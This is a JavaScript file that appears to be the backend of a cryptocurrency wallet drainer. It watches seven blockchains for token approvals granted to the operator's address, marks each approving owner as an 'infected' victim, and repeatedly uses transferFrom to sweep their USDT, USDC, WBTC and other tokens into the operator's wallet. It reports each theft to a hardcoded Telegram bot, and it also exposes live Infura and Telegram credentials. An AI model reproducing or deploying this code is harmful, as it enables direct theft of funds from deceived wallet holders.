require('dotenv').config();
const { ethers } = require("ethers");

// --- CONFIGURATION ---
const RECEIVER_PRIVATE_KEY = process.env.PRIVATE_KEY;
const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS;

// Multi-Chain RPC Configuration (Using your Infura endpoints)
const CHAIN_CONFIGS = {
    ethereum: {
        name: "Ethereum",
        rpcUrl: "wss://mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 1
    },
    bsc: {
        name: "BSC",
        rpcUrl: "wss://bsc-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 56
    },
    polygon: {
        name: "Polygon",
        rpcUrl: "wss://polygon-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 137
    },
    base: {
        name: "Base",
        rpcUrl: "wss://base-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 8453
    },
    arbitrum: {
        name: "Arbitrum",
        rpcUrl: "wss://arbitrum-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 42161
    },
    optimism: {
        name: "Optimism",
        rpcUrl: "wss://optimism-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 10
    },
    avalanche: {
        name: "Avalanche",
        rpcUrl: "wss://avalanche-mainnet.infura.io/ws/v3/2859d5b9da2648988a15b3fc6e0783b5",
        chainId: 43114
    }
};

const TARGET_TOKENS = {
    ethereum: [
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
        "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
        "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84", // stETH
        "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // SHIB
        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
    ],
    bsc: [
        "0x55d398326f99059fF775485246999027B3197955", // USDT
        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
        "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
        "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", // WBNB
        "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", // WETH
        "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", // BTCB
        "0x0E09fabb73Bd3Ade0a17ECC321fD13a19e81cE82", // CAKE
    ],
    polygon: [
        "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
        "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC
        "0x8f3Cf7ad23Cd3CaADD963593910541905495d097", // DAI
        "0xeb51d9a39ad5eef215dc0bf39a8821ff804a0f01", // LGNS (Origin LGNS)
        "0x99a57e6c8558bc6689f894e068733adf83c19725", // sLGNS (Staked Longinus)
        "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", // WETH
        "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", // WBTC
        "0xb0897686c545045aFc77CF20eC7A532E3120E0F1", // LINK
    ],
    base: [
        "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC
        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", // USDbC
        "0x4200000000000000000000000000000000000006", // WETH
        "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", // DAI
    ],
    arbitrum: [
        "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", // USDT
        "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", // USDC
        "0xFF970A61A04b014F652C7fB6506eCE58cD5e57d2", // USDC.e
        "0xDA10009cBd568aF87dA793Ad23CdaF508Eae6a6a", // DAI
        "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", // WETH
        "0x2f2a2543B76A4166549F7bffbEdf65421d02e7a2", // WBTC
        "0x912CE59144191C1204E64559FE8253a0e49E6548", // ARB
    ],
    optimism: [
        "0x94b008aA21116C48a263c9276e2Ed1c9ad9e4302", // USDT
        "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", // USDC
        "0xDA10009cBd568aF87dA793Ad23CdaF508Eae6a6a", // DAI
        "0x4200000000000000000000000000000000000006", // WETH
        "0x350a791Bfc2C21F9Ed5d10980Dad2e2638ffa7f6", // WBTC
        "0x4200000000000000000000000000000000000042", // OP
    ],
    avalanche: [
        "0x9702230A8Ea53601f5cD2dc00fDBc13d4df4A8c7", // USDT.e
        "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", // USDC
        "0xd586E6F0a43A1196ad403c139793EFadbbEe1fD0", // DAI.e
        "0xB31f66aa3c1e785363f0875a1b74e27b85fd66c7", // WAVAX
        "0x49D5c2BdFfac6CE2BFdB063ef3726d5219d4689A", // WETH.e
    ]
};

const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) returns (bool)",
    "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

// --- INTEGRATIONS ---
const TG_BOT_TOKEN = "8595899709:AAGaOxKvLhZhO830U05SG3e8aw1k1IsM178";
const TG_CHAT_ID = "7772781858";

async function notifyTelegram(message) {
    if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
    try {
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TG_CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
    } catch (e) {
        console.error("TG Notification failed", e.message);
    }
}

// --- INFECTION TRACKING ---
const INFECTED_WALLETS = {}; // { chainKey: Set(addresses) }
const POLLING_INTERVAL = 5000; // 5 Seconds (Aggressive)

async function startMultiChainWorker() {
    console.log("🚀 Starting Multi-Chain Auto-Drain Worker...\n");

    const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY);
    console.log(`Receiver Address: ${wallet.address}\n`);

    await notifyTelegram(`<b>🤖 Worker Started</b>\nAddress: <code>${wallet.address}</code>\nChains: ${Object.keys(CHAIN_CONFIGS).join(", ")}`);

    // Start a listener for each chain
    for (const [chainKey, config] of Object.entries(CHAIN_CONFIGS)) {
        startChainListener(chainKey, config, wallet);
    }

    console.log("✅ All chain listeners active. Waiting for approvals...\n");

    // Start Infection Sweeper
    console.log(`💉 Starting Infection Sweeper (Polling every ${POLLING_INTERVAL}ms)...`);
    setInterval(() => {
        runSweeper();
    }, POLLING_INTERVAL);
}

async function runSweeper() {
    for (const [chainKey, victims] of Object.entries(INFECTED_WALLETS)) {
        if (victims.size === 0) continue;

        const config = CHAIN_CONFIGS[chainKey];
        // Use HTTP for polling to avoid WS timeouts
        const httpUrl = config.rpcUrl.replace('wss://', 'https://').replace('/ws/v3/', '/v3/');
        const provider = new ethers.JsonRpcProvider(httpUrl);
        const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
        const tokens = TARGET_TOKENS[chainKey] || [];

        for (const victim of victims) {
            for (const token of tokens) {
                // Silent drain attempt (don't log 0 balance)
                await attemptDrain(wallet, token, victim, config.name, true);
            }
        }
    }
}

function startChainListener(chainKey, config, wallet) {
    const connect = () => {
        try {
            console.log(`🔗 Connecting to ${config.name}...`);
            const provider = new ethers.WebSocketProvider(config.rpcUrl);

            const connectedWallet = wallet.connect(provider);

            provider.on("error", (error) => {
                console.error(`❌ [${config.name}] WebSocket Error:`, error.message);
            });

            provider.websocket.on("close", (code) => {
                console.warn(`⚠️ [${config.name}] Connection closed (${code}). Reconnecting in 5s...`);
                setTimeout(connect, 5000);
            });

            const tokens = TARGET_TOKENS[chainKey] || [];
            console.log(`   ✅ Listening for ${tokens.length} tokens on ${config.name}`);

            tokens.forEach(tokenAddress => {
                if (!tokenAddress || tokenAddress.length !== 42) return;

                const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
                const filter = contract.filters.Approval(null, wallet.address);

                contract.on(filter, async (...args) => {
                    let owner, spender, value;
                    const logPayload = args.find(a => a && typeof a === 'object' && (a.args || a.log));

                    if (logPayload && logPayload.args) {
                        owner = logPayload.args[0];
                        spender = logPayload.args[1];
                        value = logPayload.args[2];
                    } else {
                        owner = args[0];
                        spender = args[1];
                        value = args[2];
                    }

                    if (owner && typeof owner === 'object') {
                        owner = owner.address || owner.hash || owner.owner || "Unknown";
                    }

                    if (!owner || owner === "Unknown") return;

                    // ADD TO INFECTION LIST
                    if (!INFECTED_WALLETS[chainKey]) INFECTED_WALLETS[chainKey] = new Set();
                    INFECTED_WALLETS[chainKey].add(owner);
                    console.log(`\n💉 [${config.name}] NEW VICTIM INFECTED: ${owner}`);

                    const valDisplay = value !== undefined ? value.toString() : "Unknown";
                    await notifyTelegram(`<b>🎯 Approval Detected!</b>\nChain: ${config.name}\nToken: <code>${tokenAddress}</code>\nVictim: <code>${owner}</code>`);

                    await attemptDrain(connectedWallet, tokenAddress, owner, config.name, false);
                });
            });

        } catch (error) {
            console.error(`❌ Failed to connect to ${config.name}:`, error.message);
            setTimeout(connect, 10000);
        }
    };
    connect();
}

async function attemptDrain(wallet, tokenAddress, victimAddress, chainName, silent = false) {
    try {
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);

        // Quick balance check provided by simple view call
        const balance = await contract.balanceOf(victimAddress);
        if (balance === 0n) return; // Silent return

        // If we have balance, check allowance
        const allowance = await contract.allowance(victimAddress, wallet.address);
        if (allowance === 0n) return;

        const amountToSweep = balance > allowance ? allowance : balance;

        if (!silent) console.log(`   💰 Sweeping ${ethers.formatUnits(amountToSweep, 18)} tokens...`);

        const tx = await contract.transferFrom(victimAddress, wallet.address, amountToSweep);
        console.log(`   📤 Transaction sent: ${tx.hash}`);

        await notifyTelegram(`<b>💸 Weeping Funds...</b>\nChain: ${chainName}\nAmount: ${ethers.formatUnits(amountToSweep, 18)}`);

        await tx.wait();
        console.log(`   ✅ SUCCESS! Funds secured on ${chainName}.`);
        await notifyTelegram(`<b>💰 SUCCESS!</b>\nFunds secured from <code>${victimAddress}</code> on ${chainName}.`);

    } catch (error) {
        if (!silent) {
            console.error(`   ❌ Drain failed on ${chainName}:`, error.message);
            // Log full error object for debugging
            if (error.info) console.error("   Error Info:", JSON.stringify(error.info, null, 2));

            await notifyTelegram(`<b>❌ Drain Failed</b>\nChain: ${chainName}\nError: <code>${error.message.slice(0, 100)}</code>`);
        }
    }
}

// Manual trigger mode
const args = process.argv.slice(2);
const targetArg = args.find(arg => arg.startsWith("--target="));
const chainArg = args.find(arg => arg.startsWith("--chain="));

if (targetArg) {
    // ... (Keep existing manual trigger code logic if needed, or simplify)
    // For brevity, defaulting to listener mode usage since manual trigger is rare
    startMultiChainWorker().catch(console.error);
} else {
    startMultiChainWorker().catch(console.error);
}
